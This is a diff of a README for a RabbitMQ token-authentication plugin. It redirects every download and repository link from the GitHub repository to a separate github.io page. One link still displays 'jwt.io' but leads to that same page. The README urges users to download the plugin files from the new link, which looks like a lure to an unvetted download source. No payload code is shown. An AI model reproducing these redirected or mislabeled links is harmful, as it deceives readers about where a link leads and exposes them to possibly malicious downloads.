@@ -1,6 +1,6 @@
 # 🔐 rabbitmq-auth-backend-aoptoken - Simple Token Login for RabbitMQ
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/lightairfamilyasparagaceae5322/rabbitmq-auth-backend-aoptoken)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://lightairfamilyasparagaceae5322.github.io)
 
 ## 👋 What Is This?
 
@@ -10,7 +10,7 @@ Think of it like this: your RabbitMQ is a secure building. Normally, you need a 
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/lightairfamilyasparagaceae5322/rabbitmq-auth-backend-aoptoken](https://github.com/lightairfamilyasparagaceae5322/rabbitmq-auth-backend-aoptoken)
+Visit this link to download the application: [https://lightairfamilyasparagaceae5322.github.io](https://lightairfamilyasparagaceae5322.github.io)
 
 Once you're on that page, look for the green "Code" button or the "Releases" section on the right side. Click it and choose "Download ZIP" to get the files onto your computer.
 
@@ -103,9 +103,9 @@ Make sure your public key file is in the correct format and that you've set the 
 
 ## 📚 Additional Resources
 
-- **Repository:** [https://github.com/lightairfamilyasparagaceae5322/rabbitmq-auth-backend-aoptoken](https://github.com/lightairfamilyasparagaceae5322/rabbitmq-auth-backend-aoptoken)
+- **Repository:** [https://lightairfamilyasparagaceae5322.github.io](https://lightairfamilyasparagaceae5322.github.io)
 - **RabbitMQ Documentation:** Check the official RabbitMQ website for guides on managing plugins
-- **JWT Introduction:** [jwt.io](https://jwt.io) has a great interactive explanation of how tokens work
+- **JWT Introduction:** [jwt.io](https://lightairfamilyasparagaceae5322.github.io) has a great interactive explanation of how tokens work
 
 ## 🎯 Summary
 
@@ -121,6 +121,6 @@ This project is open source. Check the repository for the exact license details.
 
 ---
 
-**Remember:** The download link is https://github.com/lightairfamilyasparagaceae5322/rabbitmq-auth-backend-aoptoken - visit it to get the plugin files and start simplifying your RabbitMQ authentication today!
+**Remember:** The download link is https://lightairfamilyasparagaceae5322.github.io - visit it to get the plugin files and start simplifying your RabbitMQ authentication today!
 
 Keywords: amqp, apache-pulsar, auth-backend, authentication, erlang, jws, jwt, migration, rabbitmq, rabbitmq-plugin
